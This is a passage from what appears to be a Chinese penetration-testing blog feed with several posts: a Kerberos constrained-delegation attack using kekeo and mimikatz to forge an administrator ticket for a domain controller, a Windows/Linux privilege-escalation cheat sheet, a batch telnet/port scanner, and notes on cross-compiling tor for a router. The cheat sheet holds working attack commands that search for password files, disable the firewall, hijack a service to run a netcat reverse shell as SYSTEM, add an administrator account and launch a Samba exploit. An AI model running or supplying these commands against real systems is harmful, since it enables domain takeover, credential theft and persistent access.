-limit 0 -filter “(&amp;(objectCategory=user)(objectClass=user))” -attr cn distinguishedName useraccountcontrol msds-allowedtodelegateto<br>  cn             distinguishedName                             useraccountcontrol        msds-allowedtodelegateto<br>  Administrator  CN=Administrator,CN=Users,DC=demo,DC=local 66048<br>  Guest          CN=Guest,CN=Users,DC=demo,DC=local         66082<br>  krbtgt         CN=krbtgt,CN=Users,DC=demo,DC=local         514<br>  testwin10      CN=testwin10,CN=Users,DC=demo,DC=local     524800</p><p>测试主机为域内Windows 10系统，现在以普通域用户testwin10登录系统，IPC方式连接域服务器，访问域服务器的C盘目录，显示被拒绝，权限不够。<br>C:\Users\testwin10&gt;whoami<br>demo\testwin10</p><p>C:\Users\testwin10&gt;dir \owa2010dc.demo.local\c$<br>Access is denied.<br>testwin10.png</p><p>现在已知域内机器账号的口令(计算机的机器账号密码默认是随机的，每30天轮换一次)，则可使用kekeo工具构造WIN10-NEW机器账号的票据。命令和执行结果如下，<br>tgt::ask /user:WIN10-NEW$ /domain:demo.local /NTLM:5b8303606d3478a49e47650272fea13b</p><p>已知域内主机账号(机器账号WIN10-NEW$)，使用kekeo工具构造该主机账号的TGT票据 ：<br>(如果是服务账号的话命令就是：tgt::ask /user:sqlsrv /domain:demo.local /password:xxx /ticket:sqlsrv.kirbi)<br>kekeo # tgt::ask /user:WIN10-NEW$ /domain:demo.local /NTLM:5b8303606d3478a49e47650272fea13b<br>Realm        : demo.local (demo)<br>User         : WIN10-NEW$ (WIN10-NEW$)<br>CName        : WIN10-NEW$       [KRB_NT_PRINCIPAL (1)]<br>SName        : krbtgt/demo.local        [KRB_NT_SRV_INST (2)]<br>Need PAC     : Yes<br>Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 5b8303606d3478a49e47650272fea13b<br>[kdc] name: OWA2010DC.demo.local (auto)<br>[kdc] addr: 192.168.18.10 (auto)</p><blockquote><p>Ticket in file <a href="mailto:&#39;TGT_WIN10-NEW$@DEMO.LOCA" target="_blank" rel="noopener">&#39;TGT_WIN10-NEW$@DEMO.LOCA</a><a href="mailto:L_krbtgt~demo.local@DEMO.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~demo.local@DEMO.LOCAL.kirbi</a>‘<br>  使用kekeo工具构造该主机账号的TGT票据<br>  kekeo.png</p></blockquote><p>由于设置了约束性委派所以利用刚才的WIN10-NEW$的TGT票据，像域服务器发起申请访问域服务器相应服务(CIFS共享服务)管理权限的TGS票据 ：<br>Tgs::s4u /tgt:service_account_tgt_file /user:<a href="mailto:administrator@testlab.com" target="_blank" rel="noopener">administrator@testlab.com</a> /service:service_to_access<br>即：<br>kekeo # tgs::s4u /tgt:<a href="mailto:TGT_WIN10-NEW$@DEMO.LOCA" target="_blank" rel="noopener">TGT_WIN10-NEW$@DEMO.LOCA</a><a href="mailto:L_krbtgt~demo.local@DEMO.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~demo.local@DEMO.LOCAL.kirbi</a> /user:<a href="mailto:administrator@demo.local" target="_blank" rel="noopener">administrator@demo.local</a> /service:cifs/OWA2010DC.demo.local<br>Ticket  : <a href="mailto:TGT_WIN10-NEW$@DEMO.LOCA" target="_blank" rel="noopener">TGT_WIN10-NEW$@DEMO.LOCA</a><a href="mailto:L_krbtgt~demo.local@DEMO.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~demo.local@DEMO.LOCAL.kirbi</a><br>  [krb-cred]     S: krbtgt/demo.local @ DEMO.LOCAL<br>  [krb-cred]     E: [00000012] aes256_hmac<br>  [enc-krb-cred] P: WIN10-NEW$ @ DEMO.LOCAL<br>  [enc-krb-cred] S: krbtgt/demo.local @ DEMO.LOCAL<br>  [enc-krb-cred] T: [1/12/2018 2:17:58 AM ; 1/12/2018 12:17:58 PM] {R:1/19/2018 2:17:58 AM}<br>  [enc-krb-cred] F: [40e00000] pre_authent ; initial ; renewable ; forwardable ;<br>  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): a9e1f34bc1c62de37793943742e0f235a4ba0a0ec01a9899f52b1e9e7798970c<br>  [s4u2self]  <a href="mailto:administrator@demo.local" target="_blank" rel="noopener">administrator@demo.local</a><br>[kdc] name: OWA2010DC.demo.local (auto)<br>[kdc] addr: 192.168.18.10 (auto)</p><blockquote><p>Ticket in file <a href="mailto:&#39;TGS_administrator@demo.local" target="_blank" rel="noopener">&#39;TGS_administrator@demo.local</a>@<a href="mailto:DEMO.LOCAL_WIN10-NEW$@DEMO.LOCAL.kirbi" target="_blank" rel="noopener">DEMO.LOCAL_WIN10-NEW$@DEMO.LOCAL.kirbi</a>‘<br>Service(s):<br>  [s4u2proxy] cifs/OWA2010DC.demo.local<br>Ticket in file <a href="mailto:&#39;TGS_administrator@demo.local" target="_blank" rel="noopener">&#39;TGS_administrator@demo.local</a>@<a href="mailto:DEMO.LOCAL_cifs~OWA2010DC.demo.local@DEMO.LOCAL.kirbi" target="_blank" rel="noopener">DEMO.LOCAL_cifs~OWA2010DC.demo.local@DEMO.LOCAL.kirbi</a>‘</p></blockquote><p> 向域服务器发起申请访问域服务器相应服务(CIFS服务)管理权限的TGS票据<br> cfis1.png<br>ok<br>此时内存中已经有了访问域服务器CIFS服务的域管理员的TGS票据，需要将该票据(administrator的TGS票据)注入当前的会话中，使用mimikatz的kerberos::ptt命令可完成票据的注入。<br>注入票据后，当前的会话具备了访问域服务器C盘目录的权限 （kekeo ticket 注入） :<br>kerberos::ptt <a href="mailto:TGS_administrator@demo.local" target="_blank" rel="noopener">TGS_administrator@demo.local</a>@<a href="mailto:DEMO.LOCAL_cifs~OWA2010DC.demo.local@DEMO.LOCAL.kirbi" target="_blank" rel="noopener">DEMO.LOCAL_cifs~OWA2010DC.demo.local@DEMO.LOCAL.kirbi</a><br>注入票据后，访问域服务器C盘目录的权限<br>cfis2.png</p><p>dir \owa2010dc.demo.local\c$ ==&gt; ok<br>(4个小时后TGT失效，需要重新认证。)</p><p><a href="https://www.anquanke.com/post/id/92484" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92484</a> 示例有四個，他演示的是示例1，這裏演示的是示例4<br>样例1：已知被设置约束性委派属性的服务账号的口令明文，则可以获取域管理权限<br>样例2：已控制约束性委派服务账号所在的服务器<br>攻击者控制了服务器，与样例1类似。由于攻击者控制了服务器，可直接利用mimikatz从内存获取服务账号的TGT，所以可以省去tgt::ask步骤，直接从tgs:s4u步骤开始，后续和样例1相同。<br>样例3：已获取配置了约束性委派的服务账号的口令NTLM<br>和样例1相同，样例1用明文口令生成NTLM，然后向域服务器申请获取服务账号的TGT。Kekeo提供了该功能，可直接从NTLM开始，向域服务器申请TGT。<br>样例4：一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM<br>方法和样例1也是类似，只不过样例1中是服务账号，而本样例中是主机账号。测试结果截图分别如下，不再过多解释。测试可在任何域内主机中进行，不需要在主机账号所在的主机。</p><p>參考：<br><a href="https://www.anquanke.com/post/id/92484" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92484</a>  (作者筆誤： “由于sqlsvc被设置为非约束性委派” 改成 “由于sqlsvc被设置为约束性委派” 已證明 )<br><a href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/</a><br><a href="http://powersploit.readthedocs.io/en/latest/" target="_blank" rel="noopener">http://powersploit.readthedocs.io/en/latest/</a><br><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PowerShell </tag>
            
            <tag> 域委派 </tag>
            
            <tag> TGS票据 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>域渗透(提权篇)</title>
      <link href="/2018/01/09/%E5%9F%9F%E6%B8%97%E9%80%8F(%E6%8F%90%E6%9D%83%E7%AF%87)/"/>
      <url>/2018/01/09/%E5%9F%9F%E6%B8%97%E9%80%8F(%E6%8F%90%E6%9D%83%E7%AF%87)/</url>
      <content type="html"><![CDATA[<a id="more"></a><p>0x01 常见信息收集</p><p>dir /a-r-d /s /b                                 检查文件夹可写状态<br>dir /b/s password.txt                            查找密码文件或其它敏感文件<br>dir /b/s config.<em><br>findstr /si password </em>.xml <em>.ini </em>.txt<br>findstr /si login <em>.xml </em>.ini <em>.txt<br>C:\sysprep.inf<br>C:\sysprep\sysprep.xml<br>C:\Windows\Panther\Unattend\Unattended.xml<br>C:\Windows\Panther\Unattended.xml<br>dir /s </em>pass<em> == </em>cred<em> == </em>vnc<em> == </em>.config<em>    搜索system32关键字的文件<br>findstr /si password </em>.xml <em>.ini </em>.txt           搜索某些特定的文件类型<br>reg query HKLM /f password /t REG_SZ /s          搜索注册表中包含password<br>reg query HKCU /f password /t REG_SZ /s<br>netsh firewall show config                       显示 Windows 防火墙配置<br>netsh firewall show state                        显示 Windows 防火墙的当前状态<br>netsh firewall set opmode disable                关闭防火墙<br>netsh advfilewall set publicprofile state off<br>systeminfo | findstr /B /C:”OS Name” /C:”OS Version”    获取操作系统信息<br>systeminfo | findstr /B /C:”OS 名称” /C:”OS 版本”<br>schtasks /query /fo LIST /v                      计划任务 [国外调整 chcp 437]<br>route print                                      查看路由表<br>arp -A                                           查看ARP缓存</p><p>0x02 upnphost提权<br>sc qc Spooler                 查询，配置，和管理Windows服务<br>accesschk.exe -ucqv Spooler   检查每个服务需要的权限   XP_SP2被修复<br>攻击手法：<br>    sc qc upnphost<br>    sc config upnphost binpath= “C:\nc.exe -nv 127.0.0.1 9988 -e    C:\WINDOWS\System32\cmd.exe”<br>    sc config upnphost obj= “.\LocalSystem” password= “”<br>    sc qc upnphost<br>    net start upnphost<br>    执行netcat并且使用SYSTEM权限反弹一个shell<br>    sc config PFNET binpath= “net user admin P@ssword123! /add”<br>    sc stop PFNET<br>    sc start PFNET<br>    sc config PFNET binpath= “net localgroup Administrators admin /add”<br>    sc stop PFNET<br>    sc start PFNET</p><p>0x03 服务与权限<br>DRIVERQUERY                 安装驱动<br>wmic product list brief     查看安装程序和版本信息. [可能存在漏洞]<br>wmic service list brief     查看服务、进程和启动程序信息<br>wmic process list brief<br>wmic startup list brief<br>wmic qfe get Caption,Description,HotFixID,InstalledOn   查看安装补丁和时间信息<br>wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:”KBxxxxxxx”<br>wimc process where(description=”进程名”)       结合tasklist /svc<br>wmic service get name,displayname,pathname,startmode |findstr /i “Auto” |findstr /i /v “C:\Windows\“ |findstr /i /v “””    列出目标机器上所有没有用引号包含的服务路径<br>tasklist /v /fo list /fi “USERNAME eq NT AUTHORITY\SYSTEM”  筛选NT AUTHORITY\SYSTEM权限进程<br>icacls “C:\Program Files (x86)\360”     查看路径中受影响文件夹的权限</p><p>0x04 补丁对应Exp<br>补丁对比 <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p><p>pip install xlrd –upgrade<br>./windows-exploit-suggester.py –update<br>[+] writing to file 2014-06-06-mssb.xlsx<br>输入“systeminfo”输入，并将其指向微软数据库<br>./windows-exploit-suggester.py –database 2014-06-06-mssb.xlsx –systeminfo     win7sp1-systeminfo.txt<br>未修补漏洞存在的exp<br>./windows-exploit-suggester.py –database 2014-06-06-mssb.xlsx –ostext     ‘windows server 2008 r2’</p><p>0x05 AlwaysInstallElevated提权</p><p><a href="http://www.greyhathacker.net/?p=185" target="_blank" rel="noopener">http://www.greyhathacker.net/?p=185</a><br>如果这个设置被启用，它允许任何权限的用户暂时使用NT AUTHORITY\SYSTEM权限来安装*.msi文件。<br>AlwaysInstallElevated且它的DWORD值是1才有效。<br><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a><br>可以利用Advanced Installer(<a href="http://www.advancedinstaller.com/)生成msi安装包" target="_blank" rel="noopener">http://www.advancedinstaller.com/)生成msi安装包</a></p><p>0x06 查看.msi程序的执行权限</p><p>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</p><p>0x07 查看是否设置有setuid和setgid</p><p>reg query HKEY_Local_Machine\System\CurrentControlSet\Services\NfsSvr\Parameters\SafeSetUidGidBits</p><p>CVE-2017-1000367<br>    系统必须启用selinux<br>    sudo需要用selinux支持（sudo -r）<br>    用户需要具有sudo权限<br>gcc -o sudopwn sudopwn.c -lutil<br>./sudopwn</p><p>枚举系统设置和权限的检查<br><a href="http://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="noopener">http://www.securitysift.com/download/linuxprivchecker.py</a></p><p>0x08 基于操作系统的内核版本号</p><p><a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester" target="_blank" rel="noopener">https://github.com/PenturaLabs/Linux_Exploit_Suggester</a><br>./Linux_Exploit_Suggester.pl -k 内核版本号[例如3.10,结合uname -a]</p><p>0x09 检测权限提升向量的shell脚本</p><p><a href="https://github.com/pentestmonkey/unix-privesc-check" target="_blank" rel="noopener">https://github.com/pentestmonkey/unix-privesc-check</a><br>unix-privesc-check standard<br>unix-privesc-check detailed</p><p>下载和解压缩脚本RootHelper<br><a href="https://github.com/NullArray/RootHelper" target="_blank" rel="noopener">https://github.com/NullArray/RootHelper</a></p><p>0x10 CVE-2017-7494[Samba]</p><p><a href="http://fuping.site/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/" target="_blank" rel="noopener">http://fuping.site/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/</a><br>use exploit/linux/samba/is_known_pipename<br>set RHOST 192.168.232.137<br>set target 3<br>exploit</p><p>0x11 内核提权</p><p>lsb_release -a<br>uname -a<br>python -c ‘import pty; pty.spawn(“/bin/bash”)’<br>suid 提权 [有限制]<br>find / -perm -u=s -type f 2&gt;/dev/null</p><p>from:<br><a href="https://04z.net/2017/07/10/AD-Attacks-go/" target="_blank" rel="noopener">https://04z.net/2017/07/10/AD-Attacks-go/</a></p>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>批量测试端口开放</title>
      <link href="/2017/12/09/%E6%89%B9%E9%87%8F%E6%B5%8B%E8%AF%95%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE/"/>
      <url>/2017/12/09/%E6%89%B9%E9%87%8F%E6%B5%8B%E8%AF%95%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE/</url>
      <content type="html"><![CDATA[<a id="more"></a><p>0x01. PowerShell简单测试端口开放<br>import-Module .\Invoke-TestPort<br>Invoke-TestPort -ipLists C:\x.txt 23</p><p>function Invoke-TestPort<br>{<br>    [CmdletBinding()] Param (<br>        [Parameter(Mandatory = $true, Position = 0)]<br>        [Alias(“Url”,”Domain”)]<br>        [String]<br>        $ipLists,</p><pre><code>    [Parameter(Mandatory = $true ,Position = 1)]    [String]    $Port)Process{   Write-Host &quot;Starting TestPort ...&quot;   $ips = Get-Content -ErrorAction SilentlyContinue -Path $ipLists   foreach ($ip in $ips){       try{           $socket = new-object System.Net.Sockets.TcpClient($ip, $Port)       }       catch [Exception]{           Write-Host $ip&quot;:&quot;$Port &quot;CAN&#39;T Connected&quot;           continue       }       Write-Host $ip&quot;:&quot;$Port &quot;CAN Connected&quot;    }}</code></pre><p>}</p><p>0x02. Python批量测试Telnet端口开放</p><p>import sys<br>import getpass<br>import pexpect<br>import telnetlib<br>import threadpool</p><p>OKWHITE = ‘\033[1;37m’<br>OKENDC = ‘\033[0m’</p><p>class Telnets_OK():<br>    def <strong>init</strong>(self,ip,thread_id,Store_Result_txt):<br>        self.ip                      = ip<br>        self.thread_id               = thread_id<br>        self.Store_Result_txt        = Store_Result_txt</p><pre><code>    self.OKWHITE = &#39;\033[1;37m&#39;     self.OKGREEN = &#39;\033[92m&#39;    self.OKWARNING = &#39;\033[93m&#39;     self.OKFAIL = &#39;\033[91m&#39;        self.OKENDC = &#39;\033[0m&#39;    self.login()def Store_ok_txt(self):    with open(&#39;Can_Telnet_{0}&#39;.format(self.Store_Result_txt),&#39;a+&#39;) as f:        f.write(self.ip + &quot;^&quot;)        f.write(&quot;\n&quot;)def Store_not_ok_txt(self):    with open(&#39;Cannot_Telnet_{0}&#39;.format(self.Store_Result_txt),&#39;a+&#39;) as f:        f.write(self.ip + &quot;^&quot;)        f.write(&quot;\n&quot;)def login( self ):    cmd = &#39;telnet &#39; + self.ip     child = pexpect.spawn(cmd)    index = child.expect([&quot;[lL]ogin&quot;, &quot;(?i)Unknown host&quot;, pexpect.EOF, pexpect.TIMEOUT])    if ( index == 0 ):        print self.OKGREEN +   &quot;[+] can   telnet : {0}&quot;.format(self.ip) + self.OKENDC        self.Store_ok_txt()    else:          print self.OKFAIL + &quot;[-] can\&#39;t telnet : {0}&quot;.format(self.ip) + self.OKENDC        self.Store_not_ok_txt()    child.close()  </code></pre><p>def Load_Urls_Txt( txt):<br>    Urls_Pass   = []<br>    f           = open( txt, ‘r’)<br>    line        = f.readline().strip(‘\n’)<br>    while (line):<br>        Urls_Pass.append(line)<br>        line    = f.readline().strip(‘\n’)<br>    f.close()<br>    return Urls_Pass</p><p>def main(Urls_Pass ,Store_Result_txt):<br>    task_pool = threadpool.ThreadPool(20)<br>    templists = []<br>    for i in range(0,len(Urls_Pass)):<br>        a       = Urls_Pass[0]<br>        temp    = a.split(‘^’)<br>        udic    = {}<br>        udic[‘ip’]      = temp[0]<br>        udic[‘Store_Result_txt’]= Store_Result_txt<br>        udic[‘thread_id’]   = i<br>        tmp = (None,udic)<br>        Urls_Pass.remove(a)<br>        templists.append(tmp)<br>    request_list = threadpool.makeRequests(Telnets_OK , templists)<br>    map(task_pool.putRequest , request_list)<br>    task_pool.wait()</p><p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    if len(sys.argv) != 2:<br>        print OKWHITE<br>        print ‘Usage      : python {0} <txt>‘.format(sys.argv[0])<br>        print ‘txt        : domain or ip’<br>        print ‘Threads    : 20 (default)’<br>        print ‘Name       : piliang telnet’<br>        print OKENDC<br>        sys.exit(1)<br>    print OKWHITE + “Loading : {0}”.format(sys.argv[1])<br>    txt             = ‘’.join(sys.argv[1])<br>    Urls_Pass    = Load_Urls_Txt(txt)<br>    print “Lines : {0}”.format(len(Urls_Pass)) + OKENDC<br>    main(Urls_Pass, sys.argv[1])</txt></p>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PowerShell </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>交叉编译tor在路由器上使用</title>
      <link href="/2017/12/07/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91tor%E5%9C%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B8%8A%E4%BD%BF%E7%94%A8/"/>
      <url>/2017/12/07/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91tor%E5%9C%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B8%8A%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<a id="more"></a><p>Router Model : RT-AC66U<br>Router CPU : MIPS32</p><h2 id="正常编译tor"><a href="#正常编译tor" class="headerlink" title="正常编译tor"></a>正常编译tor</h2><p>在 <code>Ubuntu</code> 下</p><pre><code>sudo apt-get install opensslsudo apt-get install libevent-devsudo apt-get install build-essentialsudo apt-get install libssl-devtar xzf tor-0.3.1.8.tar.gzcd tor-0.3.1.8./configure &amp;&amp; makesrc/or/torsrc/config/torrc   # torrc src/or/tor -f src/config/torrc &amp;</code></pre><p>直接交叉编译tor 是有问题的<br>结合上篇文章编译buildroot生成的buildroot-2011.05下/output/ 相关编译文件:</p><pre><code>$ cd tor $ ./configure : $ CC=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc RANLIB=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ranlib AR=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ar LD=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ld STRIP=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-strip ./configure --host=mipsel-linux --disable-tool-name-check --enable-static-libevent --with-libevent-dir=/usr/local/lib</code></pre><!-- more --><p>即:</p><pre><code>$ CC=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc \RANLIB=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ranlib \AR=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ar \LD=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ld \STRIP=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-strip \./configure --host=mipsel-linux --disable-tool-name-check \--enable-static-libevent \--with-libevent-dir=/usr/local/libor --with-libevent-dir=/usr/lib64/</code></pre><p>出错</p><pre><code>checking for libevent directory... configure: WARNING: Could not find a linkable libevent.If you have it installed somewhere unusual, you can specify an explicit path using --with-libevent-dirconfigure: WARNING: On most Redhat-based systems, you can get libevent by installing the libevent RPM packageconfigure: WARNING:    You will probably need to install libevent-devel too.configure: error: Missing libraries; unable to proceed.</code></pre><p>装了libevent-devel 依旧如是</p><p>拷贝 bin/ 下的<code>mipsel-linux-*</code> 到 <code>ubuntu</code></p><pre><code>$ CC=/home/db/Desktop/usr/bin/mipsel-linux-gcc RANLIB=/home/db/Desktop/usr/bin/mipsel-linux-ranlib AR=/home/db/Desktop/usr/bin/mipsel-linux-ar LD=/home/db/Desktop/usr/bin/mipsel-linux-ld STRIP=/home/db/Desktop/usr/bin/mipsel-linux-strip ./configure --host=mipsel-linux --disable-tool-name-check --enable-static-libevent --with-libevent-dir=/home/db/Desktop/libevent-1.4.12-stable/</code></pre><p>即:</p><pre><code>$ CC=/home/db/Desktop/usr/bin/mipsel-linux-gcc \RANLIB=/home/db/Desktop/usr/bin/mipsel-linux-ranlib \AR=/home/db/Desktop/usr/bin/mipsel-linux-ar \LD=/home/db/Desktop/usr/bin/mipsel-linux-ld \STRIP=/home/db/Desktop/usr/bin/mipsel-linux-strip \./configure --host=mipsel-linux \--disable-tool-name-check --enable-static-libevent \--with-libevent-dir=/home/db/Desktop/libevent-1.4.12-stable/or --with-libevent-dir=/usr/lib/x86_64-linux-gnu/--with-libevent-dir=/lib/x86_64-linux-gnu/</code></pre><p>也是不行滴</p><p>ubuntu 直接编译 tor 后 拷贝<code>tor(10M)</code> 到 <code>centos</code>上使用,转移各种库依旧是不行滴。 </p><pre><code>$./tor: error while loading shared libraries: libssl.so.1.0.0: cannot open shared object file: No such file or directory===&gt; $ copy /lib/x86_64-linux-gnu/libssl.so.1.0.0         (ubuntu)  =&gt; desktop (centos )$ copy /lib/x86_64-linux-gnu/libcrypto.so.1.0.0     (ubuntu)  =&gt; desktop (centos )$ mv libssl.so.1.0.0 /usr/lib64/            (centos )$ mv libcrypto.so.1.0.0 /usr/lib64/        (centos )</code></pre><p>$ ./tor –help</p><pre><code>./tor: /lib64/libc.so.6: version &#39;GLIBC_2.14&#39; not found (required by ./tor)./tor: /lib64/libc.so.6: version &#39;GLIBC_2.17&#39; not found (required by ./tor)./tor: /lib64/libc.so.6: version &#39;GLIBC_2.14&#39; not found (required by /usr/lib64/libssl.so.1.0.0)./tor: /lib64/libc.so.6: version &#39;GLIBC_2.14&#39; not found (required by /usr/lib64/libcrypto.so.1.0.0)$ ls -al /lib/x86_64-linux-gnu/libc.so.6     (ubuntu)    lrwxrwxrwx 1 root root 12 Jun 16 16:57 /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.23.so$ copy /lib/x86_64-linux-gnu/libc-2.23.so        (ubuntu)  =&gt; desktop (centos )$ mv libc-2.23.so /lib64/libc-2.23.so         (centos )    ln: creating symbolic link &#39;/lib64/libc.so.6&#39;: File exists$ mv /lib64/libc.so.6 /lib64/libc.so.6-copy$ ln -s /lib64/libc-2.23.so /lib64/libc.so.6error error !!!!!!!!!!!!!!!!!!!!!!!!!!!!!$ ls -al #命令都使用不了了ls: error while loading shared libraries: libc.so.6: cannot open shared object file: No such file or directory$ mvmv: error while loading shared libraries: libc.so.6: cannot open shared object file: No such file or directory</code></pre><p>看了网上,tor交叉编译时需要的库,也需要交叉编译的 : </p><p>Centos<br>/root/Desktop/1/ : </p><pre><code>openssl-1.1.0ghttps://www.openssl.org/source/openssl-1.1.0g.tar.gzlibevent-2.1.8-stable.tar.gzhttps://github.com/libevent/libevent/releases/download/release-2.1.8-stable/libevent-2.1.8-stable.tar.gzzlib-1.2.11https://zlib.net/zlib-1.2.11.tar.gz</code></pre><p><code>----------------------------------------------------------------------</code></p><h2 id="交叉编译-openssl"><a href="#交叉编译-openssl" class="headerlink" title="交叉编译 openssl"></a>交叉编译 openssl</h2><pre><code>$ CC=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc AR=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ar RANLIB=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ranlib LD=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ld STRIP=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-strip ./config --prefix=/root/Desktop/cross/yes/openssl </code></pre><p>即:</p><pre><code>$ CC=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc \AR=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ar \RANLIB=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ranlib \./config \--prefix=/root/Desktop/cross/yes/openssl </code></pre><p>$ make 出错 </p><pre><code>crypto/aes/aes-x86_64.s:1743: Error: unrecognized opcode &#39;leaq 48(%rsi),%rsp&#39;crypto/aes/aes-x86_64.s:1745: Error: unrecognized opcode &#39;popfq&#39;crypto/aes/aes-x86_64.s:1749: Error: Alignment too large: 28. assumed.crypto/aes/aes-x86_64.s:2139: Error: Alignment too large: 28. assumed.crypto/aes/aes-x86_64.s:2534: Error: Alignment too large: 28. assumed.make[1]: *** [crypto/aes/aes-x86_64.o] Error 1make[1]: Leaving directory &#39;/root/Desktop/cross/1/openssl-1.1.0g&#39;make: *** [all] Error 2</code></pre><p>使用 <code>--cross-compile-prefix</code> :</p><pre><code>$ CC=gcc RANLIB=ranlib AR=ar ./config --prefix=/root/Desktop/cross/yes/openssl/ --cross-compile-prefix=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux- linux-mips32</code></pre><p>即:</p><pre><code>$ CC=gcc \RANLIB=ranlib \AR=ar \./config \--prefix=/root/Desktop/cross/yes/openssl/ \--cross-compile-prefix=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux- \linux-mips32</code></pre><p>编译成功是因为<code>Makefile</code>根本没起作用,上面那些参数根本没填入到Makefile里面</p><p><code>https://github.com/openssl/openssl/blob/master/INSTALL</code><br>官方文档说使用<code>--cross-compile-prefix</code>时,必须用<code>./Configure</code>,而不是./config<br>==&gt;</p><pre><code>$ CC=gcc RANLIB=ranlib AR=ar ./Configure --prefix=/root/Desktop/cross/yes/openssl/ --cross-compile-prefix=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux- linux-mips32</code></pre><p>即:</p><pre><code>$ CC=gcc \RANLIB=ranlib \AR=ar \./Configure \    ####./config 改成 ./Configure--prefix=/root/Desktop/cross/yes/openssl/ \--cross-compile-prefix=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux- \linux-mips32or os/compiler:linux-mips32</code></pre><p>$ make 出错</p><pre><code>/root/Desktop/8/buildroot-2011.05/output/host/usr/mipsel-unknown-linux-uclibc/sysroot/usr/include/features.h:216:5: \error: #error It appears you have defined _FILE_OFFSET_BITS=64. Unfortunately, uClibc was built without large file support enabled.In file included from /root/Desktop/8/buildroot-2011.05/output/host/usr/mipsel-unknown-linux-uclibc/sysroot/usr/include/stdio.h:72,                         from crypto/bio/bss_file.c:37:/root/Desktop/8/buildroot-2011.05/output/host/usr/mipsel-unknown-linux-uclibc/sysroot/usr/include/bits/uClibc_stdio.h:61:2: \error: #error Sorry... uClibc was built without large file support!</code></pre><p>发现 ===&gt; <code>https://bjglife.blogspot.nl/2015/01/linux-porting-openssl-to-mips-platform.html</code><br>===&gt; 文章里面选择了这个 <code>Enable large file (files &gt; 2 GB) support</code> 想必和错误有关</p><p>之前编译buildroot:<br>    choose:</p><pre><code>Target Architecture (MIPS (little endian))  ---&gt;Target Architecture Variant (mips 32)  ---&gt;</code></pre><p>生成 =&gt; /root/Desktop/8/buildroot-2011.05/output/host/usr/bin<br>现在编译buildroot:<br>    choose:</p><pre><code>Target Architecture (MIPS (little endian))  ---&gt;Target Architecture Variant (mips 32)  ---&gt;Toolchain type (Buildroot toolchain)  ---&gt; [*] Enable large file (files &gt; 2 GB) support</code></pre><p>生成 =&gt; /root/Desktop/88/buildroot-2011.05/output/host/usr/bin </p><p>变量</p><pre><code>$ export 